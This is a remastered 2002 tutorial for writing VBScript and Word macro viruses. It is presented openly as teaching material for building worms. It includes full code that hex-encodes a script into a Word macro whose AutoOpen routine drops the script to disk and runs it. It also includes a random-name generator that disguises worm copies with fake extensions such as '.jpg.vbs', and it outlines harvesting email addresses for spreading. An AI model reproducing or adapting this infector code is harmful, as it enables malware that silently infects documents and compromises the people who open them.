# 🧠 VBS Tutorial  
### ✍️ By PetiK (05/05/2002) — Remastered in 2025

---

## 📌 Introduction

This tutorial was written after creating **VBS.Xchange** and **VBS.Doublet**, two VBS/DOC infectors.

### Summary:
- 🔢 Hex Conversion: Convert a VBS file into a Word module
- ✉️ Spread with "mailto:": Harvest emails from HTML files
- 🌀 Random Name Generator: Rename worm copy at each start

This tutorial is intended for learners and curious minds—not expert coders or lamers.

---

## 🔢 HEX CONVERSION

Why convert a file to hexadecimal?  
➡️ To embed it inside a Word document's macro module.

### 📜 Full Source Code

```vbscript
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set fl=fso.OpenTextFile(WScript.ScriptFullName,1)
virus=fl.ReadAll
fl.Close

Set sp=fso.CreateTextFile("example_vbshex.txt",True,8)
sp.WriteLine "Attribute VB_Name = ""VirModule"""
sp.WriteLine "Sub AutoOpen()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "e = """""

For i=1 To len(virus)

e=Mid(virus,i,1)
e=Hex(Asc(e))

If Len(e)=1 Then
e="0"&e
End If

f=f+e
If Len(f)=110 Then
sp.WriteLine "e = e + """ & f & """"
f=""
End If

If Len(virus)-i = 0 Then
sp.WriteLine "e = e + """ & f & """"
f=""
End If

Next

sp.WriteLine "read=dec(e)"
sp.WriteLine "Open ""C:\newvbsfile.vbs"" For Output As #1"
sp.WriteLine "Print #1, read"
sp.WriteLine "Close #1"
sp.WriteLine "Shell ""wscript C:\newvbsfile.vbs"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Function dec(octe)"
sp.WriteLine "For hexad = 1 To Len(octe) Step 2"
sp.WriteLine "dec = dec & Chr(""&h"" & Mid(octe, hexad, 2))"
sp.WriteLine "Next"
sp.WriteLine "End Function"
sp.Close
```

---

## ✉️ SPREAD WITH `mailto:`

When WAB is inaccessible, extract `mailto:` addresses from `.htm`, `.html`, `.asp`, etc.

```vbscript
' Full code provided in the original article...
```

---

## 🌀 RANDOM NAME GENERATOR

Generate a new random filename at each worm execution.

```vbscript
tmpname=""
randomize(timer)
namel=int(rnd(1)*20)+1
For lettre = 1 To namel
randomize(timer)
tmpname=tmpname & chr(int(rnd(1)*26)+97)
Next
typext = "execombatbmpjpggifdocxlsppthtmhtthta"
randomize(timer)
tmpext = int(rnd(1)*11)+1
tmpname=tmpname & "." & mid(typext,((tmpext-1)*3)+1,3) & ".vbs"

MsgBox tmpname
```

---

## 📬 Conclusion

That's the end of this VBS tutorial.  
If you have questions or want to contribute, feel free to contact me:

✉️ petikvx@aol.com  
🌐 www.petikvx.fr.fm
